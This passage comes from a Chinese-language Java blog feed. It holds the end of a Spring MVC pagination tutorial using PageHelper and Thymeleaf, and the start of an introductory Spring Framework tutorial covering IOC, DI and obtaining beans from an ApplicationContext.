&#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getSex</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> sex;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSex</span><span class="params">(String sex)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getEmail</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> email;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setEmail</span><span class="params">(String email)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.email = email;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建控制层组件EmployeeController</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EmployeeController</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> EmployeeService employeeService;</span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/employee/page/&#123;pageNum&#125;&quot;, method = RequestMethod.GET)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getEmployeeList</span><span class="params">(Model model, <span class="meta">@PathVariable(&quot;pageNum&quot;)</span> Integer pageNum)</span>&#123;</span><br><span class="line">        PageInfo&lt;Employee&gt; page = employeeService.getEmployeeList(pageNum);</span><br><span class="line">        model.addAttribute(<span class="string">&quot;page&quot;</span>, page);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;employee_list&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建接口EmployeeService</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">EmployeeService</span> &#123;</span><br><span class="line">PageInfo&lt;Employee&gt; <span class="title function_">getEmployeeList</span><span class="params">(Integer pageNum)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建实现类EmployeeServiceImpl</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EmployeeServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">EmployeeService</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> EmployeeMapper employeeMapper;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> PageInfo&lt;Employee&gt; <span class="title function_">getEmployeeList</span><span class="params">(Integer pageNum)</span> &#123;</span><br><span class="line">        PageHelper.startPage(pageNum, <span class="number">4</span>);</span><br><span class="line">        List&lt;Employee&gt; list = employeeMapper.getEmployeeList();</span><br><span class="line">        PageInfo&lt;Employee&gt; page = <span class="keyword">new</span> <span class="title class_">PageInfo</span>&lt;&gt;(list, <span class="number">5</span>);</span><br><span class="line">        <span class="keyword">return</span> page;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="②创建页面-1"><a href="#②创建页面-1" class="headerlink" title="②创建页面"></a>②创建页面</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span> <span class="attr">xmlns:th</span>=<span class="string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Employee Info<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">th:href</span>=<span class="string">&quot;@&#123;/static/css/index_work.css&#125;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">th</span> <span class="attr">colspan</span>=<span class="string">&quot;6&quot;</span>&gt;</span>Employee Info<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">th</span>&gt;</span>emp_id<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">th</span>&gt;</span>emp_name<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">th</span>&gt;</span>age<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">th</span>&gt;</span>sex<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">th</span>&gt;</span>email<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">th</span>&gt;</span>options<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">tr</span> <span class="attr">th:each</span>=<span class="string">&quot;employee : $&#123;page.list&#125;&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;employee.empId&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;employee.empName&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;employee.age&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;employee.sex&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;employee.email&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span>&gt;</span>delete<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span>&gt;</span>update<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span> <span class="attr">colspan</span>=<span class="string">&quot;6&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">span</span> <span class="attr">th:if</span>=<span class="string">&quot;$&#123;page.hasPreviousPage&#125;&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">a</span> <span class="attr">th:href</span>=<span class="string">&quot;@&#123;/employee/page/1&#125;&quot;</span>&gt;</span>首页<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">a</span> <span class="attr">th:href</span>=<span class="string">&quot;@&#123;&#x27;/employee/page/&#x27;+$&#123;page.prePage&#125;&#125;&quot;</span>&gt;</span>上一页<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">span</span> <span class="attr">th:each</span>=<span class="string">&quot;num : $&#123;page.navigatepageNums&#125;&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">a</span> <span class="attr">th:if</span>=<span class="string">&quot;$&#123;page.pageNum==num&#125;&quot;</span></span></span><br><span class="line"><span class="tag">                           <span class="attr">th:href</span>=<span class="string">&quot;@&#123;&#x27;/employee/page/&#x27;+$&#123;num&#125;&#125;&quot;</span> <span class="attr">th:text</span>=<span class="string">&quot;&#x27;[&#x27;+$&#123;num&#125;+&#x27;]&#x27;&quot;</span> <span class="attr">style</span>=<span class="string">&quot;color:red;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">a</span> <span class="attr">th:if</span>=<span class="string">&quot;$&#123;page.pageNum!=num&#125;&quot;</span></span></span><br><span class="line"><span class="tag">                           <span class="attr">th:href</span>=<span class="string">&quot;@&#123;&#x27;/employee/page/&#x27;+$&#123;num&#125;&#125;&quot;</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;num&#125; &quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">span</span> <span class="attr">th:if</span>=<span class="string">&quot;$&#123;page.hasNextPage&#125;&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">a</span> <span class="attr">th:href</span>=<span class="string">&quot;@&#123;&#x27;/employee/page/&#x27;+$&#123;page.nextPage&#125;&#125;&quot;</span>&gt;</span>下一页<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">a</span> <span class="attr">th:href</span>=<span class="string">&quot;@&#123;&#x27;/employee/page/&#x27;+$&#123;page.pages&#125;&#125;&quot;</span>&gt;</span>末页<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="③访问测试分页功能"><a href="#③访问测试分页功能" class="headerlink" title="③访问测试分页功能"></a>③访问测试分页功能</h3><p>localhost:8080&#x2F;employee&#x2F;page&#x2F;1</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二、Spring</title>
      <link href="/2023/04/21/Java/%E4%BA%8C%E3%80%81Spring/"/>
      <url>/2023/04/21/Java/%E4%BA%8C%E3%80%81Spring/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="二、Spring"><a href="#二、Spring" class="headerlink" title="二、Spring"></a>二、Spring</h1><h2 id="1、Spring简介"><a href="#1、Spring简介" class="headerlink" title="1、Spring简介"></a>1、Spring简介</h2><h3 id="1-1、Spring概述"><a href="#1-1、Spring概述" class="headerlink" title="1.1、Spring概述"></a>1.1、Spring概述</h3><p>官网地址：<a href="https://spring.io/">https://spring.io/</a></p><blockquote><p>Spring 是最受欢迎的企业级 Java 应用程序开发框架，数以百万的来自世界各地的开发人员使用</p><p>Spring 框架来创建性能好、易于测试、可重用的代码。</p><p>Spring 框架是一个开源的 Java 平台，它最初是由 Rod Johnson 编写的，并且于 2003 年 6 月首</p><p>次在 Apache 2.0 许可下发布。</p><p>Spring 是轻量级的框架，其基础版本只有 2 MB 左右的大小。</p><p>Spring 框架的核心特性是可以用于开发任何 Java 应用程序，但是在 Java EE 平台上构建 web 应</p><p>用程序是需要扩展的。 Spring 框架的目标是使 J2EE 开发变得更容易使用，通过启用基于 POJO</p><p>编程模型来促进良好的编程实践。</p></blockquote><h3 id="1-2、Spring家族"><a href="#1-2、Spring家族" class="headerlink" title="1.2、Spring家族"></a>1.2、Spring家族</h3><p>项目列表：<a href="https://spring.io/projects">https://spring.io/projects</a></p><h3 id="1-3、Spring-Framework"><a href="#1-3、Spring-Framework" class="headerlink" title="1.3、Spring Framework"></a>1.3、Spring Framework</h3><p>Spring 基础框架，可以视为 Spring 基础设施，基本上任何其他 Spring 项目都是以 Spring Framework为基础的。</p><h4 id="1-3-1、Spring-Framework特性"><a href="#1-3-1、Spring-Framework特性" class="headerlink" title="1.3.1、Spring Framework特性"></a>1.3.1、Spring Framework特性</h4><ul><li>非侵入式：使用 Spring Framework 开发应用程序时，Spring 对应用程序本身的结构影响非常</li></ul><p>小。对领域模型可以做到零污染；对功能性组件也只需要使用几个简单的注解进行标记，完全不会</p><p>破坏原有结构，反而能将组件结构进一步简化。这就使得基于 Spring Framework 开发应用程序</p><p>时结构清晰、简洁优雅。</p><ul><li>控制反转：IOC——Inversion of Control，翻转资源获取方向。把自己创建资源、向环境索取资源</li></ul><p>变成环境将资源准备好，我们享受资源注入。</p><ul><li>面向切面编程：AOP——Aspect Oriented Programming，在不修改源代码的基础上增强代码功</li></ul><p>能。</p><ul><li>容器：Spring IOC 是一个容器，因为它包含并且管理组件对象的生命周期。组件享受到了容器化</li></ul><p>的管理，替程序员屏蔽了组件创建过程中的大量细节，极大的降低了使用门槛，大幅度提高了开发</p><p>效率。</p><ul><li>组件化：Spring 实现了使用简单的组件配置组合成一个复杂的应用。在 Spring 中可以使用 XML</li></ul><p>和 Java 注解组合这些对象。这使得我们可以基于一个个功能明确、边界清晰的组件有条不紊的搭</p><p>建超大型复杂应用系统。</p><ul><li><p>声明式：很多以前需要编写代码才能实现的功能，现在只需要声明需求即可由框架代为实现。</p></li><li><p>一站式：在 IOC 和 AOP 的基础上可以整合各种企业应用的开源框架和优秀的第三方类库。而且</p></li></ul><p>Spring 旗下的项目已经覆盖了广泛领域，很多方面的功能性需求可以在 Spring Framework 的基</p><p>础上全部使用 Spring 来实现。</p><h4 id="1-3-2、Spring-Framework五大功能模块"><a href="#1-3-2、Spring-Framework五大功能模块" class="headerlink" title="1.3.2、Spring Framework五大功能模块"></a>1.3.2、Spring Framework五大功能模块</h4><table><thead><tr><th><strong>功能模块</strong></th><th><strong>功能介绍</strong></th></tr></thead><tbody><tr><td>Core Container</td><td>核心容器，在 Spring 环境下使用任何功能都必须基于 IOC 容器。</td></tr><tr><td>AOP&amp;Aspects</td><td>面向切面编程</td></tr><tr><td>Testing</td><td>提供了对 junit 或 TestNG 测试框架的整合。</td></tr><tr><td>Data Access&#x2F;Integration</td><td>提供了对数据访问&#x2F;集成的功能。</td></tr><tr><td>Spring MVC</td><td>提供了面向Web应用程序的集成功能。</td></tr></tbody></table><h1 id="2、IOC"><a href="#2、IOC" class="headerlink" title="2、IOC"></a>2、IOC</h1><h2 id="2-1、IOC容器"><a href="#2-1、IOC容器" class="headerlink" title="2.1、IOC容器"></a>2.1、IOC容器</h2><h3 id="2-1-1、IOC思想"><a href="#2-1-1、IOC思想" class="headerlink" title="2.1.1、IOC思想"></a>2.1.1、IOC思想</h3><p>IOC：Inversion of Control，翻译过来是<strong>反转控制</strong>。</p><h4 id="①获取资源的传统方式"><a href="#①获取资源的传统方式" class="headerlink" title="①获取资源的传统方式"></a>①获取资源的传统方式</h4><p>自己做饭：买菜、洗菜、择菜、改刀、炒菜，全过程参与，费时费力，必须清楚了解资源创建整个过程中的全部细节且熟练掌握。</p><p>在应用程序中的组件需要获取资源时，传统的方式是组件<strong>主动</strong>的从容器中获取所需要的资源，在这样的</p><p>模式下开发人员往往需要知道在具体容器中特定资源的获取方式，增加了学习成本，同时降低了开发效率。</p><h4 id="②反转控制方式获取资源"><a href="#②反转控制方式获取资源" class="headerlink" title="②反转控制方式获取资源"></a>②反转控制方式获取资源</h4><p>点外卖：下单、等、吃，省时省力，不必关心资源创建过程的所有细节。</p><p>反转控制的思想完全颠覆了应用程序组件获取资源的传统方式：反转了资源的获取方向——改由容器主动的将资源推送给需要的组件，开发人员不需要知道容器是如何创建资源对象的，只需要提供接收资源的方式即可，极大的降低了学习成本，提高了开发的效率。这种行为也称为查找的<strong>被动</strong>形式。</p><h4 id="③DI"><a href="#③DI" class="headerlink" title="③DI"></a>③DI</h4><p>DI：Dependency Injection，翻译过来是<strong>依赖注入</strong>。</p><p>DI 是 IOC 的另一种表述方式：即组件以一些预先定义好的方式（例如：setter 方法）接受来自于容器</p><p>的资源注入。相对于IOC而言，这种表述更直接。</p><p>所以结论是：IOC 就是一种反转控制的思想， 而 DI 是对 IOC 的一种具体实现。</p><h3 id="2-1-2、IOC容器在Spring中的实现"><a href="#2-1-2、IOC容器在Spring中的实现" class="headerlink" title="2.1.2、IOC容器在Spring中的实现"></a>2.1.2、IOC容器在Spring中的实现</h3><p>Spring 的 IOC 容器就是 IOC 思想的一个落地的产品实现。IOC 容器中管理的组件也叫做 bean。在创建bean 之前，首先需要创建 IOC 容器。Spring 提供了 IOC 容器的两种实现方式：</p><h4 id="①BeanFactory"><a href="#①BeanFactory" class="headerlink" title="①BeanFactory"></a>①BeanFactory</h4><p>这是 IOC 容器的基本实现，是 Spring 内部使用的接口。面向 Spring 本身，不提供给开发人员使用。</p><h4 id="②ApplicationContext"><a href="#②ApplicationContext" class="headerlink" title="②ApplicationContext"></a>②ApplicationContext</h4><p>BeanFactory 的子接口，提供了更多高级特性。面向 Spring 的使用者，几乎所有场合都使用</p><p>ApplicationContext 而不是底层的 BeanFactory。</p><h4 id="③ApplicationContext的主要实现类"><a href="#③ApplicationContext的主要实现类" class="headerlink" title="③ApplicationContext的主要实现类"></a>③ApplicationContext的主要实现类</h4><p><img src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/post-blog/ssm/5.png"></p><table><thead><tr><th><strong>类型名</strong></th><th><strong>简介</strong></th></tr></thead><tbody><tr><td>ClassPathXmlApplicationContext</td><td>通过读取类路径下的 XML 格式的配置文件创建 IOC 容器对象</td></tr><tr><td>FileSystemXmlApplicationContext</td><td>通过文件系统路径读取 XML 格式的配置文件创建 IOC 容器对象</td></tr><tr><td>ConfigurableApplicationContext</td><td>ApplicationContext 的子接口，包含一些扩展方法refresh() 和 close() ，让 ApplicationContext 具有启动、关闭和刷新上下文的能力。</td></tr><tr><td>WebApplicationContext</td><td>专门为 Web 应用准备，基于 Web 环境创建 IOC 容器对象，并将对象引入存入 ServletContext 域中。</td></tr></tbody></table><h2 id="2-2、基于XML管理bean"><a href="#2-2、基于XML管理bean" class="headerlink" title="2.2、基于XML管理bean"></a>2.2、基于XML管理bean</h2><h3 id="2-2-1、实验一：入门案例"><a href="#2-2-1、实验一：入门案例" class="headerlink" title="2.2.1、实验一：入门案例"></a>2.2.1、实验一：入门案例</h3><h4 id="①创建Maven-Module"><a href="#①创建Maven-Module" class="headerlink" title="①创建Maven Module"></a>①创建Maven Module</h4><h4 id="②引入依赖"><a href="#②引入依赖" class="headerlink" title="②引入依赖"></a>②引入依赖</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 基于Maven依赖传递性，导入spring-context依赖即可导入当前所需所有jar包 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- junit测试 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/post-blog/ssm/6.png"></p><h4 id="③创建类HelloWorld"><a href="#③创建类HelloWorld" class="headerlink" title="③创建类HelloWorld"></a>③创建类HelloWorld</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sayHello</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;helloworld&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/post-blog/ssm/7.png"></p><p><img src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/post-blog/ssm/8.png"></p><h4 id="⑤在Spring的配置文件中配置bean"><a href="#⑤在Spring的配置文件中配置bean" class="headerlink" title="⑤在Spring的配置文件中配置bean"></a>⑤在Spring的配置文件中配置bean</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">配置HelloWorld所对应的bean，即将HelloWorld的对象交给Spring的IOC容器管理</span></span><br><span class="line"><span class="comment">通过bean标签配置IOC容器所管理的bean</span></span><br><span class="line"><span class="comment">属性：</span></span><br><span class="line"><span class="comment">id：设置bean的唯一标识</span></span><br><span class="line"><span class="comment">class：设置bean所对应类型的全类名</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;helloworld&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.atguigu.spring.bean.HelloWorld&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="⑥创建测试类测试"><a href="#⑥创建测试类测试" class="headerlink" title="⑥创建测试类测试"></a>⑥创建测试类测试</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testHelloWorld</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">ac</span> <span class="operator">=</span> newClassPathXmlApplicationContext(<span class="string">&quot;applicationContext.xml&quot;</span>);</span><br><span class="line">    <span class="type">HelloWorld</span> <span class="variable">helloworld</span> <span class="operator">=</span> (HelloWorld) ac.getBean(<span class="string">&quot;helloworld&quot;</span>);</span><br><span class="line">    helloworld.sayHello();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="⑦思路"><a href="#⑦思路" class="headerlink" title="⑦思路"></a>⑦思路</h4><p><img src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/post-blog/ssm/9.png"></p><h4 id="⑧注意"><a href="#⑧注意" class="headerlink" title="⑧注意"></a>⑧注意</h4><p>Spring 底层默认通过反射技术调用组件类的无参构造器来创建组件对象，这一点需要注意。如果在需要无参构造器时，没有无参构造器，则会抛出下面的异常：</p><blockquote><p>org.springframework.beans.factory.BeanCreationException: Error creating bean with name</p><p>‘helloworld’ defined in class path resource [applicationContext.xml]: Instantiation of bean</p><p>failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed</p><p>to instantiate [com.atguigu.spring.bean.HelloWorld]: No default constructor found; nested</p><p>exception is java.lang.NoSuchMethodException: com.atguigu.spring.bean.HelloWorld.</p><p><init>()</p></blockquote><h3 id="2-2-2、实验二：获取bean"><a href="#2-2-2、实验二：获取bean" class="headerlink" title="2.2.2、实验二：获取bean"></a>2.2.2、实验二：获取bean</h3><h4 id="①方式一：根据id获取"><a href="#①方式一：根据id获取" class="headerlink" title="①方式一：根据id获取"></a>①方式一：根据id获取</h4><p>由于 id 属性指定了 bean 的唯一标识，所以根据 bean 标签的 id 属性可以精确获取到一个组件对象。</p><p>上个实验中我们使用的就是这种方式。</p><h4 id="②方式二：根据类型获取"><a href="#②方式二：根据类型获取" class="headerlink" title="②方式二：根据类型获取"></a>②方式二：根据类型获取</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testHelloWorld</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">ac</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;applicationContext.xml&quot;</span>);</span><br><span class="line">    <span class="type">HelloWorld</span> <span class="variable">bean</span> <span class="operator">=</span> ac.getBean(HelloWorld.class);</span><br><span class="line">    bean.sayHello();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="③方式三：根据id和类型"><a 